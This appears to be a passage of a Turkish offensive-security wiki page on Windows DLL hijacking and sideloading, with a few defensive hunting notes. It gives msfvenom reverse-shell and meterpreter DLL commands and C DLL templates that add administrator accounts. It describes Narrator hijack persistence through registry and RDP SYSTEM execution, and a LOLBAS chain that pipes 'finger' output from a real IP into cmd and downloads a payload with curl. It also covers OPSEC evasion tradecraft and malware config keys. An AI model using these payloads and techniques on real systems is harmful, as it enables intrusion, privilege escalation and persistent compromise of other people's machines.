msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir meterpreter (x86) elde et:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Bir kullanıcı oluştur (x86, x64 sürümünü göremedim):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Kendinizinki

Çoğu durumda derlediğiniz DLL, **kurban sürecin içe aktardığı her işlevi dışa aktarmalıdır**. Gerekli bir dışa aktarma eksikse ikili dosya bu işlevi çözümlenemez ve exploit başarısız olur.

<details>
<summary>C DLL şablonu (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Kullanıcı oluşturma içeren C++ DLL örneği</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>İş parçacığı giriş noktasına sahip alternatif C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Vaka İncelemesi: Narrator OneCore TTS Localization DLL Hijack (Erişilebilirlik/AT'ler)

Windows Narrator.exe, başlatıldığında hâlâ tahmin edilebilir, dile özgü bir localization DLL'i arar. Bu DLL, arbitrary code execution ve persistence için hijack edilebilir.<sup>[[7]](#references)</sup>

Temel bilgiler
- Arama yolu (güncel sürümler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Eski yol (daha eski sürümler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore yolunda saldırganın kontrolündeki yazılabilir bir DLL varsa yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalışır. Export gerekmez.

Procmon ile keşif
- Filtre: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki yol için yapılan yükleme girişimini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC sessizliği
- Naive bir hijack ses çıkarır/UI öğelerini vurgular. Sessiz kalmak için attach sırasında Narrator thread'lerini enumerate edin, ana thread'i (`OpenThread(THREAD_SUSPEND_RESUME)`) açın ve `SuspendThread` ile askıya alın; kendi thread'inizde devam edin. Tam kod için PoC'ye bakın.<sup>[[8]](#references)</sup>

Accessibility yapılandırmasıyla tetikleme ve kalıcılık
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle Narrator başlatıldığında yerleştirilmiş DLL yüklenir. Güvenli masaüstünde (oturum açma ekranında), Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.

RDP ile tetiklenen SYSTEM yürütmesi (yatay hareket)
- Klasik RDP güvenlik katmanını etkinleştirin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Ana makineye RDP ile bağlanın; oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın. DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
- RDP oturumu kapatıldığında yürütme durur; zaman kaybetmeden inject/migrate edin.

Kendi Accessibility aracını getir (BYOA)
- Yerleşik bir Accessibility Tool (AT) kayıt defteri girdisini (ör. CursorIndicator) klonlayıp düzenleyerek rastgele bir binary/DLL'e yönlendirebilir, içe aktarabilir ve ardından `configuration` değerini bu AT'nin adına ayarlayabilirsiniz. Bu yöntem, Accessibility framework'ü altında rastgele kod yürütülmesini sağlar.

Notlar
- `%windir%\System32` içine yazmak ve HKLM değerlerini değiştirmek için admin hakları gerekir.
- Tüm payload mantığı `DLL_PROCESS_ATTACH` içinde bulunabilir; export gerekmez.

## Örnek Olay: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme

Bu örnek, Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`) içindeki **Phantom DLL Hijacking** tekniğini gösterir. Bu zafiyet **CVE-2025-1729** olarak izlenmektedir.<sup>[[2]](#references)[[3]](#references)</sup>

### Zafiyet Detayları

- **Bileşen**: `C:\ProgramData\Lenovo\TPQM\Assistant\` konumundaki `TPQMAssistant.exe`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, her gün 9:30 AM'de oturum açmış kullanıcının bağlamında çalışır.
- **Dizin İzinleri**: `CREATOR OWNER` tarafından yazılabilir; bu, yerel kullanıcıların istedikleri dosyaları bırakmasına olanak tanır.
- **DLL Arama Davranışı**: Önce çalışma dizininden `hostfxr.dll` yüklemeye çalışır ve DLL bulunmadığında "NAME NOT FOUND" kaydını tutar. Bu, yerel dizinin arama önceliğine sahip olduğunu gösterir.

### Exploit Uygulaması

Bir saldırgan, eksik DLL'den yararlanarak kullanıcının bağlamında kod yürütülmesini sağlamak için aynı dizine kötü amaçlı bir `hostfxr.dll` stub'ı yerleştirebilir:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Saldırı Akışı

1. Standart kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin, geçerli kullanıcının bağlamında saat 9:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir yönetici oturum açmışsa, kötü amaçlı DLL yöneticinin oturumunda orta bütünlük düzeyinde çalışır.
4. Orta bütünlük düzeyinden SYSTEM ayrıcalıklarına yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Örnek Olay: MSI CustomAction Dropper + İmzalı Bir Host Üzerinden DLL Side-Loading (wsc_proxy.exe)

Tehdit aktörleri, yükleri güvenilir ve imzalı bir süreç altında çalıştırmak için sıklıkla MSI tabanlı dropper'ları DLL side-loading ile birlikte kullanır.<sup>[[10]](#references)</sup>

Zincire genel bakış
- Kullanıcı MSI dosyasını indirir. GUI kurulum sırasında bir CustomAction sessizce çalışır (ör. LaunchApplication veya bir VBScript eylemi) ve gömülü kaynaklardan sonraki aşamayı yeniden oluşturur.
- Dropper, meşru ve imzalı bir EXE ile kötü amaçlı bir DLL'yi aynı dizine yazar (örnek çift: Avast imzalı wsc_proxy.exe + saldırganın kontrolündeki wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL arama sırası önce çalışma dizinindeki wsc.dll dosyasını yükler ve saldırgan kodunu imzalı bir üst süreç altında çalıştırır (ATT&CK T1574.001).

MSI analizi (nelere bakılmalı)
- CustomAction tablosu:
  - Çalıştırılabilir dosyaları veya VBScript'i çalıştıran girdileri arayın. Şüpheli bir örüntü: arka planda gömülü bir dosyayı çalıştıran LaunchApplication.
  - Orca'da (Microsoft Orca.exe), CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB dosyasındaki gömülü/bölünmüş yükler:
  - Yönetimsel olarak dışarı çıkarma: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ya da lessmsi kullanın: lessmsi x package.msi C:\out
  - Bir VBScript CustomAction tarafından birleştirilen ve şifresi çözülen birden fazla küçük parça arayın. Yaygın akış:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre koyun:
  - wsc_proxy.exe: Meşru, imzalı host (Avast). İşlem, bulunduğu dizinden ada göre wsc.dll dosyasını yüklemeye çalışır.
  - wsc.dll: Saldırganın DLL dosyası. Belirli export'lar gerekmiyorsa DllMain yeterli olabilir; aksi hâlde bir proxy DLL oluşturup payload'ı DllMain içinde çalıştırırken gerekli export'ları orijinal kütüphaneye yönlendirin.
- Minimal bir DLL payload'ı oluşturun:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Export gereksinimleri için payload’unuzu da çalıştıran bir forwarding DLL oluşturmak üzere proxying framework (ör. DLLirant/Spartacus) kullanın.

- Bu teknik, host binary’nin DLL name resolution işlemine dayanır. Host absolute path’ler veya safe loading flag’leri kullanıyorsa (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded export’lar önceliği etkileyebilir; host binary ve export set’i seçerken bunları göz önünde bulundurun.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point, Ink Dragon’ın ShadowPad’i, meşru yazılımlarla uyum sağlayıp temel payload’u diskte şifreli tutan **üç dosyalı bir triad** kullanarak dağıttığını anlattı:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi vendor’lar istismar edilir (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar executable’ı Windows binary’si gibi görünecek şekilde yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode signature geçerliliğini korur.
2. **Malicious loader DLL** – EXE’nin yanına, beklenen adla bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework’üyle obfuscate edilmiş bir MFC binary’sidir; tek görevi şifrelenmiş blob’u bulmak, şifresini çözmek ve ShadowPad’i reflectively map etmektir.
3. **Encrypted payload blob** – genellikle aynı dizine `<name>.tmp` olarak kaydedilir. Şifresi çözülmüş payload’u memory-map ettikten sonra loader, forensic kanıtları yok etmek için TMP dosyasını siler.

Tradecraft notları:

* İmzalı EXE’yi yeniden adlandırmak (PE header’daki özgün `OriginalFileName` değerini korurken), vendor signature’ını muhafaza edip Windows binary’si gibi görünmesini sağlar. Bu nedenle Ink Dragon’ın `conhost.exe` görünümündeki, aslında AMD/NVIDIA yardımcı programları olan binary’leri bırakma alışkanlığını taklit edin.
* Executable güvenilir kaldığından, çoğu allowlisting kontrolü için yalnızca malicious DLL’in yanına yerleştirilmesi yeterlidir. Loader DLL’i özelleştirmeye odaklanın; imzalı parent genellikle değiştirilmeden çalışabilir.
* ShadowPad’in decryptor’ü, TMP blob’un loader’ın yanında bulunmasını ve mapping sonrasında dosyayı sıfırlayabilmek için yazılabilir olmasını bekler. Payload yüklenene kadar dizini yazılabilir tutun; belleğe alındıktan sonra OPSEC için TMP dosyası güvenle silinebilir.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatörler, diskteki tek özel artifact’in güvenilir EXE’nin yanındaki malicious DLL olmasını sağlamak için DLL sideloading’i LOLBAS ile birlikte kullanır:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Gizli PowerShell, `cmd.exe /c` başlatır, komutları bir Finger server’dan alır ve `cmd`’ye pipe eder:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host`, TCP/79 üzerinden metin çeker; `| cmd` sunucu yanıtını çalıştırır ve operatörlerin ikinci aşamayı sunucu tarafında değiştirmesine olanak tanır.

- **Yerleşik indirme/çıkarma:** Zararsız bir uzantıya sahip arşivi indirip çıkarın ve sideload hedefini ve DLL’yi rastgele bir `%LocalAppData%` klasörüne yerleştirin:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ilerleme bilgisini gizler ve yönlendirmeleri izler; `tar -xf`, Windows'un yerleşik tar aracını kullanır.

- **WMI/CIM ile başlatma:** EXE'yi WMI üzerinden başlatın; böylece telemetride, yanındaki DLL yüklenirken CIM tarafından oluşturulmuş bir işlem görünür:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Yerel DLL'leri tercih eden binary'lerle çalışır (örn. `intelbq.exe`, `nearby_share.exe`); payload (örn. Remcos) güvenilir ad altında çalışır.

- **Avlama:** `/p`, `/m` ve `/c` seçenekleri birlikte kullanıldığında `forfiles` için uyarı oluşturun; yönetici script'leri dışında bu kullanım yaygın değildir.


## Vaka İncelemesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom saldırısı, NSIS ile paketlenmiş bir dropper'ı dağıtmak için güvenilir bir güncelleme zincirini kötüye kullandı; dropper, bir DLL sideload ve tamamen bellekte çalışan payload'ları hazırladı.<sup>[[13]](#references)</sup>

Tradecraft akışı
- `update.exe` (NSIS), `%AppData%\Bluetooth` oluşturur, **HIDDEN** olarak işaretler, yeniden adlandırılmış bir Bitdefender Submission Wizard `BluetoothService.exe`, kötü amaçlı bir `log.dll` ve şifrelenmiş bir `BluetoothService` blob'u bırakır, ardından EXE'yi başlatır.
- Ana EXE, `log.dll`'yi import eder ve `LogInit`/`LogWrite` işlevlerini çağırır. `LogInit` blob'u mmap ile yükler; `LogWrite` özel bir LCG tabanlı akış şifresiyle (sabitler **0x19660D** / **0x3C6EF35F**, anahtar malzemesi önceki bir hash'ten türetilir) şifresini çözer, buffer'ı düz metin shellcode ile üzerine yazar, geçici verileri serbest bırakır ve shellcode'a atlar.
- IAT kullanmamak için loader, export adlarını **FNV-1a basis 0x811C9DC5 + prime 0x1000193** kullanarak hash'ler, ardından Murmur tarzı bir avalanche (**0x85EBCA6B**) uygular ve salt eklenmiş hedef hash'lerle karşılaştırır.

Ana shellcode (Chrysalis)
- Beş geçiş boyunca `gQ2JR&9;` anahtarıyla toplama/XOR/çıkarma işlemlerini tekrarlayarak PE benzeri bir ana modülün şifresini çözer, ardından import çözümlemesini tamamlamak için dinamik olarak `Kernel32.dll` → `GetProcAddress` yükler.
- DLL ad dizelerini çalışma zamanında, karakter başına bit döndürme/XOR dönüşümleriyle yeniden oluşturur, ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- **PEB → InMemoryOrderModuleList** üzerinde dolaşan, her export tablosunu 4 baytlık bloklar halinde Murmur tarzı karıştırmayla ayrıştıran ikinci bir resolver kullanır ve yalnızca hash bulunamadığında `GetProcAddress`'e başvurur.

Gömülü yapılandırma ve C2
- Yapılandırma, bırakılan `BluetoothService` dosyasının içinde **offset 0x30808**'de (boyut **0x980**) bulunur ve RC4 ile `qwhvb^435h&*7` anahtarı kullanılarak şifresi çözülür; böylece C2 URL'si ve User-Agent ortaya çıkar.
- Beacon'lar noktayla ayrılmış bir host profili oluşturur, başına `4Q` etiketi ekler, ardından HTTPS üzerinden `HttpSendRequestA` çağrısı yapmadan önce `vAuig34%^325hGV` anahtarıyla RC4 kullanarak şifreler. Yanıtların RC4 şifresi çözülür ve bir etiket switch'iyle yönlendirilir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer durumları).
- Çalıştırma modu CLI argümanlarına bağlıdır: argüman yoksa `-i` işaretçisini hedefleyen persistence (service/Run key) kurulur; `-i` kendisini `-k` ile yeniden başlatır; `-k` kurulumu atlar ve payload'ı çalıştırır.

Gözlemlenen alternatif loader
- Aynı saldırıda Tiny C Compiler bırakıldı ve `C:\ProgramData\USOShared\` dizininden, yanındaki `libtcc.dll` ile birlikte `svchost.exe -nostdlib -run conf.c` çalıştırıldı. Saldırganın sağladığı C kaynak kodu shellcode içeriyordu; derlenip, PE'yi diske yazmadan bellekte çalıştırıldı. Şununla yeniden oluşturun:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- TCC tabanlı bu derleme ve çalıştırma aşaması, `Wininet.dll` dosyasını çalışma zamanında içe aktarıyor ve sabit kodlanmış bir URL'den ikinci aşama shellcode'unu çekiyordu; böylece derleyici çalışması gibi görünen esnek bir loader sağlıyordu.

## Signed-host sideloading with export proxying + host thread parking

Bazı DLL sideloading zincirlerinde **stability engineering** uygulanır; böylece meşru host, kötü amaçlı DLL yüklendikten sonra çökmeden, sonraki aşamaları düzgünce yükleyecek kadar uzun süre çalışır.<sup>[[11]](#references)</sup>

Gözlemlenen örüntü
- Beklenen bağımlılık adıyla (ör. `version.dll`) güvenilir bir EXE'yi kötü amaçlı bir DLL'nin yanına bırakın.
- Kötü amaçlı DLL, içe aktarma çözümlemesinin başarılı olması ve host sürecinin çalışmaya devam etmesi için beklenen tüm export'ları gerçek sistem DLL'sine (ör. `%SystemRoot%\\System32\\version.dll`) **proxy'ler**.
- Yüklendikten sonra, kötü amaçlı DLL host'un giriş noktasına yama uygular; böylece ana thread, çıkmak veya süreci sonlandıracak kod yollarını çalıştırmak yerine sonsuz bir `Sleep` döngüsüne girer.
- Yeni bir thread gerçek kötü amaçlı işi yapar: sonraki aşama DLL'sinin adını veya yolunu çözer (RC4/XOR yaygındır), ardından `LoadLibrary` ile başlatır.

Önemi
- Normal DLL proxying, API uyumluluğunu korur; ancak host'un sonraki aşamalar için yeterince uzun süre çalışacağını garanti etmez.
- Ana thread'i `Sleep(INFINITE)` içinde bekletmek, loader bir worker thread'de şifre çözme, staging veya ağ başlangıç işlemlerini yaparken imzalı sürecin bellekte kalmasını sağlamanın basit bir yoludur.
- Yalnızca şüpheli bir `DllMain` aramak bu örüntüyü gözden kaçırabilir; çünkü ilginç davranış, host'un giriş noktasına yama uygulandıktan ve ikincil bir thread başlatıldıktan sonra gerçekleşir.

Asgari iş akışı
1. İmzalı host EXE'yi kopyalayın ve yerel dizinden hangi DLL'yi çözdüğünü belirleyin.
2. Aynı işlevleri export eden ve bunları meşru DLL'ye yönlendiren bir proxy DLL oluşturun.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluşturun.
4. Bu thread'den host'un giriş noktasına veya ana thread'in başlangıç yordamına yama uygulayarak `Sleep` üzerinde döngüye girmesini sağlayın.
5. Sonraki aşama DLL'sinin adını/yapılandırmasını çözün ve `LoadLibrary` çağırın ya da payload'u manual-map ile yükleyin.

Savunma açısından incelenecek noktalar
- `version.dll` veya benzeri yaygın kütüphaneleri `System32` yerine kendi uygulama dizinlerinden yükleyen imzalı süreçler.
- Görüntü yüklendikten kısa süre sonra süreç giriş noktasındaki bellek yamaları; özellikle `Sleep`/`SleepEx`'e yönlendirilen jump/call talimatları.
- Proxy DLL tarafından oluşturulan ve şifresi çözülmüş bir adla ikinci bir DLL üzerinde hemen `LoadLibrary` çağıran thread'ler.
- `ProgramData`, `%TEMP%` veya açılmış arşiv yolları gibi yazılabilir staging dizinlerinde, üreticiye ait çalıştırılabilir dosyaların yanına yerleştirilmiş, tüm export'ları proxy'leyen DLL'ler.

## References

- [1] [Red Canary – Intelligence Insights: Ocak 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows'ta DLL hijacking. Basit bir C örneği.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore, Avrupa'yı Hedef Alan Yeni Kötü Amaçlı Yazılımlar Dağıtıyor](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack'leri Windows yardımcı araçlarıyla buluştuğunda](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Dijital Doppelgänger'lar: Gh0st RAT Dağıtan Gelişen Kimliğe Bürünme Kampanyalarının Anatomisi](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Kesişen Çıkarlar: Güneydoğu Asya'daki Bir Hükümeti Hedef Alan Tehdit Kümelerinin Analizi](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon'ın İç Yüzü: Gizli Bir Saldırı Operasyonunun Aktarma Ağı ve İşleyişi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom'ın araç setine derinlemesine bakış](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack zinciri](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – İranlı APT Screening Serpens'in 2026 Casusluk Kampanyalarını İzleme](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Hızlı ve Öfkeli: İran Çatışması Sırasında Nimbus Manticore Operasyonları](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Görev Eylemleri](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062, Güneydoğu Asya Hükümetlerini ve Kritik Altyapıyı Hedef Alıyor](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
